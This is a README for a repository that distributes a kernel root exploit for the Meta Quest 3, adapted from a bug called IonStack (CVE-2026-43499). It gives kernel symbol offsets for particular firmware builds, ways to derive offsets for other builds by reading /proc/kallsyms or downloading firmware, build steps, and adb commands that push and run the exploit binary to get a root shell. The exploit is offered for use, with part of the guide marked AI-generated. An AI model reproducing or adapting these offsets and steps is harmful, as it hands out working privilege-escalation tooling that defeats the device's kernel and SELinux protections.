# IonStack exploit for Meta Quest 3

Root exploit for Meta Quest 3, adapted from IonStack (CVE-2026-43499) in [CyberMeowfia](https://github.com/NebuSec/CyberMeowfia).

# Use at your own risk!!!

```
IonStackQuest3/
├── src/
│   ├── targets/              ← Target-specific offsets
│   │   ├── eureka-52168470043600520/
│   │   │   └── target.h      ← Offsets for that firmware
│   │   └── eureka-52168470052900520/
│   │       └── target.h      ← Offsets for this firmware
│   ├── config.c              ← Runtime overrides
│   ├── preload.c             ← Main exploit logic
│   └── ...
├── ionstack.conf             ← Runtime config (overrides compiled offsets)
└── Makefile                  ← Build system
 ```

# to adjust for your build version(ai generated) 
```
Step 1: Create the target directory
# For their specific firmware version
mkdir -p src/targets/eureka-521684700XYZ12345
Step 2: Create target.h
```

```
bash
# Copy from an existing target
cp src/targets/eureka-52168470043600520/target.h \
   src/targets/eureka-521684700XYZ12345/target.h

# Edit the offsets
nano src/targets/eureka-521684700XYZ12345/target.h
Step 3: Update the offsets
```


They need to find the offsets for their firmware. Here's how:

🔍 How to Find Offsets for ANY Quest 3 Firmware
Tool 1: gen_ionstack_config.py (If you have kernel.elf)
```
bash
# Download their firmware
wget https://files.cocaine.trade/firmware/meta/Quest%203/q3_521684700XYZ12345.zip

# Extract kernel.elf
unzip q3_521684700XYZ12345.zip kernel.elf

# Generate the config
python3 scripts/gen_ionstack_config.py kernel.elf ionstack ionstack_xyz.conf
Tool 2: Extract from Running Device (If they have root)
bash
# On the Quest 3 (as root):
cat /proc/kallsyms > /sdcard/kallsyms.txt
cat /proc/kallsyms | grep -E "_text|init_task|ashmem|selinux" > /sdcard/symbols.txt

# Pull to PC
adb pull /sdcard/symbols.txt

# Calculate offsets:
# offset = runtime_address - KASLR_base
# KASLR_base is printed by the exploit (e.g., base=ffffffda50600000)
Tool 3: Manual Symbol Extraction
bash
# Get the kernel text base (needed to calculate offsets)
adb shell "cat /proc/kallsyms | grep ' _text$'"

# Get specific symbols
adb shell "cat /proc/kallsyms | grep -E ' ashmem_misc$| ashmem_fops$| init_task$'"

# Example output:
# ffffffda52a42198 B selinux_state
# ffffffda527ec200 D init_task
# ffffffda50819688 D ashmem_misc
What Offsets Need to Be Updated
Critical offsets in target.h:

c
// KASLR / Memory Layout
#define KIMAGE_TEXT_BASE_DEFAULT 0xffffffc008000000ULL
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
#define P0_PHYS_OFFSET 0x80000000ULL
#define P0_KERNEL_PHYS_LOAD 0xA8000000ULL

// ASHMEM - The main exploit target
#define ASHMEM_MISC_FOPS_OFF 0x2819688    // miscdevice fops slot
#define ASHMEM_FOPS_OFF 0x01ec7f20        // ashmem_fops table
#define ASHMEM_IOCTL_OFF 0x143a040        // CFI thunks

// KERNEL VARIABLES
#define INIT_TASK_OFF 0x027ec200
#define ROOT_TASK_GROUP_OFF 0x028f0700

// SELINUX (Critical for su daemon)
#define SELINUX_ENFORCING_OFF 0x02a42199  // +1 offset fix!
#define SELINUX_BLOB_SIZES_OFF 0x01f044f0

// SLIDE INFOLAK
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x027e6478
#define SLIDE_SYSCTL_BOOTID_OFF 0x02a4f1d9
```

## Device Info

| Item | Value |
|------|-------|
| Device | Meta Quest 3 |
| Architecture | aarch64 |
| Kernel | `Linux localhost 5.10.240-g69827d40d782 #1 SMP PREEMPT Mon Jun 1 13:01:51 PDT 2026 aarch64 Toybox` |
| Incremental | `52168470043600520` |
| mm_struct | order-2 |

Kernels of similar versions are likely to work without re-adaptation.

## Usage

### 1. Obtain ionstack.conf

#### Pre-adapted version

If your kernel version matches the device info above, skip ionstack.conf.

#### Unadapted version (generate via GitHub Actions)

If your firmware version differs, you can auto-generate the config via GitHub Actions:

1. **Fork this repository.**
2. **Get your device's incremental number** via adb:
   ```sh
   adb shell getprop ro.build.version.incremental
   ```
3. **Download the matching firmware.** If you don't know the download URL, use the following (replace `{incremental}` with the value from the previous step):
   ```
   https://files.cocaine.trade/firmware/meta/Quest%203/q3_{incremental}.zip
   ```
4. **Run the Action:** In your forked repo, run the `generate-ionstack-config` workflow, fill in the firmware download URL, wait for completion, and download the generated `ionstack.conf`.

### 2. Obtain preload

#### Option A: Download from Releases

Download the precompiled `preload` binary from the [Releases](../../releases) page.

#### Option B: Build from source

Requires Android NDK. The recommended version is:
```
https://dl.google.com/android/repository/android-ndk-r29-linux.zip
```

After installing the NDK, build from the project directory:
```sh
make
```

### 3. Deploy and run

Push files to the device and execute:

```sh
# Push preload
adb push preload /data/local/tmp/

# Push ionstack.conf if your incremental differs from 52168470043600520
# (skip this step if your device matches the default incremental above)
adb push ionstack.conf /data/local/tmp/

# Make executable and run
adb shell chmod +x /data/local/tmp/preload
adb shell /data/local/tmp/preload
```

If everything works, you should get a root shell.

## Notes

- Do NOT modify any system partition, especially do not run any manager install commands. This can brick your device.
- Running the exploit may cause the Quest to hang. If this happens, long-press the power button to force reboot.
- The exploit has the highest success rate right after boot. A fresh reboot is recommended before running.



## Credits

- [CyberMeowfia](https://github.com/NebuSec/CyberMeowfia) — original IonStack (CVE-2026-43499) exploit
- [@zhuowei/cheese](https://github.com/zhuowei/cheese) — key adaptation info
- [kernelsnitch](https://github.com/lukasmaar/kernelsnitch) — kernel module
